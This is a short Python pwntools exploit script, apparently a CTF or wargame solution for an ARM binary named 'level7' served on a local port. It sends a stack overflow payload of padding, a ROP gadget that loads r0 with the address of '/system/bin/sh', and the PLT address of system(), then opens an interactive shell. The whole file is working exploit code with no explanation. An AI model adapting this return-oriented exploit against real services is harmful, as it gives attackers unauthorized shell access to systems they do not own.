#!/usr/bin/env python
from pwn import *
 
#p = process('./level7')
p = remote('127.0.0.1',10001)

p.recvuntil('\n')

#0x0000894a : ldr r0, [sp, #0xc] ; add sp, #0x14 ; pop {pc}
gadget1 = 0x0000894a + 1

#"/system/bin/sh"
r0 = 0x000096C0

#.plt:00008404 ; int system(const char *command)
systemaddr = 0x00008404 

payload =  '\x00'*132 + p32(gadget1) + "\x00"*0xc + p32(r0) + "\x00"*0x4 + p32(systemaddr)

p.send(payload)
 
p.interactive()

